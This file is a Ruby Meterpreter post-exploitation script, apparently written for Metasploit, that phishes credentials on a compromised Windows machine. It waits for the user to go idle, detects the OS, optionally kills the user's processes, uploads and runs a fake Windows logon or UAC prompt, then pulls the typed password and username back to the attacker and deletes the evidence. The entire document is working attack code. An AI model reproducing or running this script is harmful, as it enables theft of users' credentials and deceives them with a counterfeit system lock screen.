print_status("Let's phish !")
# Author: Wave
@exec_opts = Rex::Parser::Arguments.new(
  "-h"  => [ false,  "This help menu"],

 "-f"  => [ true,  "path to logon_phisher files, default /root/Logon_phisher"],
 "-os"  => [ true,  "force to use an os design. available : WINXP,WIN7,WIN8,WIN10 "],

 "-u"  => [ false,  "pish user and password, default phish only password"],

 "-n"  => [ false,  "dont wait user to go away, just phish directly"],
 "-c"  => [ false,  "spawn an UAC prompt instead Windows logon"],
 "-t"  => [ true,  "idle time to wait before consdering user is afk"],
 "-k"  => [ false,  "kill users processes, really recomanded because logon will pbly spwn on background if you dont choose this options"],
)
usergone = 0
idletime = 100
kill = false
pigeonpath = "/root/Logon_phisher"
user = false
username = ""
uac = false
os = "error"
password = "notfound"
idlewait = true

# Usage Message Function
#-------------------------------------------------------------------------------
def usage
print_good("This script will spawn a fake windows logon page, and return entered passwords.")

  print_line(@exec_opts.usage)
  raise Rex::Script::Completed
end
##########functions#############
######function to choose the good executable and return path#############
def choose_exe(os,user,uac,pigeonpath)
print_status("searching files in #{pigeonpath}")
if user == false && uac == false
if os == "WIN10"
file = ("#{pigeonpath}/Windows10.exe")
elsif os == "WIN8"
file = ("#{pigeonpath}/Windows8.exe")
elsif os == "WIN7"
file = ("#{pigeonpath}/Windows7.exe")
elsif os == "WINXP"
file = ("#{pigeonpath}/WindowsXP.exe")
elsif os == "error"
print_error("OS undetected")
end 
end
if user == true && uac == false
if os == "WIN10"
file = ("#{pigeonpath}/Windows10_user.exe")
elsif os == "WIN8"
file = ("#{pigeonpath}/Windows8_user.exe")
elsif os == "WIN7"
file = ("#{pigeonpath}/Windows7_user.exe")
elsif os == "WINXP"
file = ("#{pigeonpath}/WindowsXP_user.exe")
elsif os == "error"
print_error("OS undetected")
end 
end
if uac == true
print_line("no OS detection for this, only 1 design exist")
file = "#{pigeonpath}/UAC_prompt.exe"
end
return file
end
######function to upload the right executable and execute it#############
def uploadexec(file)
location = session.sys.config.getenv('TEMP')
dfile = "#{location}\\logon.exe"
      print_status("Uploading exe...")
      session.fs.file.upload_file("#{dfile}","#{file}")
      print_good("logon.exe uploaded!")
      print_status("\tUploaded as #{dfile}")
session.sys.process.execute("#{dfile}", nil, {'Hidden' => false})
end
######function to read password and return value#######################
def readpass
location = session.sys.config.getenv('TEMP')
passtext = "#{location}\\logon.txt"
print_status("reading #{passtext}")
@client.fs.file.download_file("/root/logon.txt", passtext)
client.fs.file.rm(passtext)
File.open("/root/logon.txt", "r") do |f1|  
line = f1.gets    
return line
end

end
######function to read user and return value#######################
def readuser
location = session.sys.config.getenv('TEMP')
passtext = "#{location}\\user.txt"
print_status("reading #{passtext}")
@client.fs.file.download_file("/root/user.txt", passtext)
client.fs.file.rm(passtext)
File.open("/root/user.txt", "r") do |f1|  
userline = f1.gets  
return userline 
end
 File.delete("/root/user.txt")

end
######function to detect OS and return value##########################
def os_detect
sysinfo = session.sys.config.sysinfo
print_status("detected OS #{sysinfo['OS']}")
osversion = sysinfo['OS'].index("10")
if osversion != nil && osversion <= 10
print_good("selected windows 10 phishing")
os = "WIN10"
end
osversion = nil
osversion = sysinfo['OS'].index("8")
if osversion != nil && osversion <= 10
print_good("selected windows 8 phishing")
os = "WIN8"
end
osversion = nil
osversion = sysinfo['OS'].index("7")
if osversion != nil && osversion <= 10
print_good("selected windows 7 phishing")
os = "WIN7"
end
osversion = sysinfo['OS'].index("XP")
if osversion != nil && osversion <= 10
print_good("selected windows XP phishing")
os = "WINXP"
end
return os
end
######function to monitor idletime#######################################
def idlemonitor(idletime)
currentidle = session.ui.idle_time
while currentidle <= idletime do
if currentidle <= 5
print_status("chuuut... user is using the host !")
sleep(5)
end
if currentidle >= 5
		print_status("Current Idletime: #{currentidle} seconds... lets wait a few more")
end
		sleep(5)
		currentidle = session.ui.idle_time
	end
if currentidle >= idletime
print_good("user is afk since #{currentidle} seconds... he might be gone, right ? let's fake lock the os")
usergone = 1
return usergone
end
end
#######function to monitor logon.txt creation##########
def logonmon
print_status("Waiting for user...")
location = session.sys.config.getenv('TEMP')
passtext = "#{location}\\logon.txt"
print_status("Waiting #{passtext}...")
r = nil
first = true
while r == nil
r = @client.fs.filestat.new(passtext) rescue nil
if r != nil
print_good("user typed something...")
else
if first == true
print_status("still waiting...")
first = false
end
end
sleep(5)
end
end
########functionS to terminate unwanted processes########
def detectpid
procs = []
pid = nil
username = ""
existingProcs = []
cmd = "notepad.exe"
  proc = client.sys.process.execute(cmd, nil, {'Hidden' => true })
print_good("notepad is #{proc.pid}")
pid = proc.pid
return pid

end
def detectusr(pid)
existingProcs = []
procs = []
procs = client.sys.process.processes 
 procs.each do |p|
if !existingProcs.include? p['pid']
if p['pid'] == pid
username = p['user']
print_status(username)
return username
##sleep(2)                      
end
end
end
return username
end


def killing(username)
existingProcs = []
procs = []
procs = client.sys.process.processes 
server = client.sys.process.open
  original_pid = server.pid
  print_status("Current server process: #{server.name} (#{server.pid})")
 procs.each do |p|
                  if !existingProcs.include? p['pid']
if p['name'] != "logon.exe" && p['user'] == username && p['pid'] != server.pid && p['name'] != "explorer.exe"
print_status("killing #{p['name']}")
pid = p['pid']
killpid(pid)
end
end
end
end

def killpid(pid)
begin
client.sys.process.kill(pid)    
#sleep(0.6)  
rescue ::Exception => e
print_error(e)
#sleep(0.6)                            
end
end
#####################################
@exec_opts.parse(args) { |opt, idx, val|
  case opt

  when "-h"
    usage
when "-f"
pigeonpath = val
when "-os"
os = val
when "-u"
user = true
when "-n"
idlewait = false
when "-c"
uac = true
when "-t"
idletime = val.to_i
when "-k"
kill = true
end
}


if idlewait == true
print_status("starting monitorig idletime...")
print_status("waiting #{idletime} seconds")
usergone = idlemonitor(idletime)
print_good(usergone)
else
print_error("dont wait user to go ? 5 seconds to cancel...")
sleep(5)
print_status("Lets continue...")
end
if os == "error"
os = os_detect
print_line("os #{os}")
else
print_line("forced to use a logon for #{os}")
if os != "WINXP" && os != "WIN7" && os != "WIN8" && os != "WIN10"
print_status("available : WINXP,WIN7,WIN8,WIN10")
Raise ("#{os} isn't a compatible os !")
end
end
file = choose_exe(os,user,uac,pigeonpath)
print_good("selected #{file}")
if kill == true
pid = detectpid
username = detectusr(pid)
print_good("user found : #{username}")
killing(username)
end
uploadexec(file)
logonmon
if user == true
userline = readuser
print_good("an username was typed !")
print_good(userline)
end
line = readpass
print_good("a password was typed !")
print_good(line)

###remove logon.exe####
print_status("\ndeleting logon.exe...")
location = session.sys.config.getenv('TEMP')
logonlocation = "#{location}\\logon.exe"
client.fs.file.rm(logonlocation)
print_good("file deleted")























